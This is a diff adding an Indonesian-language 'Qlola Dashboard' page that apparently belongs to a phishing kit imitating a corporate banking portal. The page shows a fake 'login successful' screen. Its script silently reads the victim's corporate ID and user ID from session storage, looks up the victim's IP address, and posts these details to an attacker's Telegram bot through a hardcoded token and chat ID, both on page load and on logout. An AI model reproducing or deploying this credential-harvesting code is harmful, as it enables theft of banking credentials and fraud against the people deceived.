@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Qlola Dashboard</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Roboto', sans-serif;
+    background: linear-gradient(180deg, #b5d4f9 0%, #1e5dbf 100%);
+    background-image: url('https://www.image2url.com/r2/default/images/1777433277823-55210f1e-3487-461e-ac15-0a1576d7805b.jpeg');
+    background-repeat: no-repeat;
+    background-size: cover;
+    background-position: center;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    color: #333;
+  }
+  .header {
+    background: rgba(255,255,255,0.95);
+    padding: 20px;
+    text-align: center;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+  }
+  .logo { width: 120px; margin-bottom: 10px; }
+  .welcome { font-size: 24px; font-weight: 700; color: #1e5dbf; }
+  .main-content {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    gap: 20px;
+  }
+  .dashboard-card {
+    background: rgba(255,255,255,0.95);
+    border-radius: 15px;
+    padding: 30px;
+    max-width: 400px;
+    width: 100%;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    text-align: center;
+  }
+  .status { font-size: 18px; font-weight: 600; color: #4CAF50; margin-bottom: 20px; }
+  .logout-btn {
+    background: #1e5dbf;
+    color: white;
+    border: none;
+    padding: 12px 30px;
+    border-radius: 25px;
+    font-weight: 600;
+    font-size: 16px;
+    cursor: pointer;
+    transition: all 0.3s;
+  }
+  .logout-btn:hover { background: #1557a7; transform: translateY(-2px); }
+  .time { position: fixed; top: 20px; left: 20px; color: white; font-size: 18px; font-family: monospace; font-weight: 300; z-index: 10; }
+  ::-webkit-scrollbar { display: none; }
+</style>
+</head>
+<body>
+<div class="time" id="time"></div>
+
+<div class="header">
+  <img src="" alt="" class="logo">
+  <div class="welcome">Selamat Datang</div>
+</div>
+
+<div class="main-content">
+  <div class="dashboard-card">
+    <div class="status">✅ Login Berhasil</div>
+    <p>Selamat datang di Dashboard Qlola</p>
+    <p><strong>Sesi aktif</strong></p>
+    <button class="logout-btn" onclick="logout()">Keluar</button>
+  </div>
+</div>
+
+<script>
+  // TOKEN TELEGRAM - SAMA DENGAN INDEX
+  const TELEGRAM_BOT_TOKEN = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM';
+  const TELEGRAM_CHAT_ID = '7213790655';
+  
+  // Cek session dari index.html
+  const sessionData = sessionStorage.getItem('qlola_login');
+  if (!sessionData) {
+    window.location.href = 'index.html'; // Redirect jika belum login
+  }
+  
+  const loginData = JSON.parse(sessionData);
+  
+  // Jam realtime
+  function updateTime() {
+    document.getElementById('time').textContent = new Date().toLocaleTimeString('id-ID', {hour12: false}).slice(0,8);
+  }
+  setInterval(updateTime, 1000); updateTime();
+  
+  // Kirim data session ke Telegram saat buka dashboard (silent)
+  window.onload = async () => {
+    const message = `🔐 *DASHBOARD QLOLA ACCESSED*\n\n📋 *Session Data:*\n• Corp ID: \`${loginData.corporateId}\`\n• User ID: \`${loginData.userId}\`\n• Login Time: \`${loginData.timestamp}\`\n\n⏰ *Dashboard Time:* ${new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'})}\n🌐 *IP:* ${await getIP()}`;
+    
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown'})
+      });
+    } catch(e) { console.error(e); }
+  };
+  
+  // Logout - hapus session dan kirim notif
+  function logout() {
+    const logoutTime = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
+    const message = `👋 *LOGOUT QLOLA*\n\n📋 *Session:*\n• User: \`${loginData.userId}\`\n• Corp ID: \`${loginData.corporateId}\`\n• Login: \`${loginData.timestamp}\`\n• Logout: ${logoutTime}`;
+    
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown'})
+    }).catch(e => console.error(e));
+    
+    sessionStorage.removeItem('qlola_login');
+    window.location.href = 'index.html';
+  }
+  
+  async function getIP() {
+    try {
+      return (await (await fetch('https://api.ipify.org?format=json')).json()).ip;
+    } catch { return 'Unknown'; }
+  }
+</script>
+</body>
+</html>
